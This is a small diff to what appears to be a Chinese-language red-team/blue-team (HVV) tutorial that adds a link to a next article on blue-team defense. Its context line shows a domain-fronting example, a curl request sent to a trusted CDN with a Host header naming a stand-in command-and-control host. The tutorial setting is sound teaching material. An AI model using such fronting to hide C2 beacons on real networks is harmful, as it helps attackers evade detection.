@@ -221,3 +221,5 @@ curl -H "Host: c2.evil.com" https://cdn.trusted-site.com/beacon
 ---
 
 *上一篇：[HVV 实战概述](01-red-blue-team.md)*
+
+*下一篇：[HVV 蓝队防御策略](03-defense-strategy.md)*
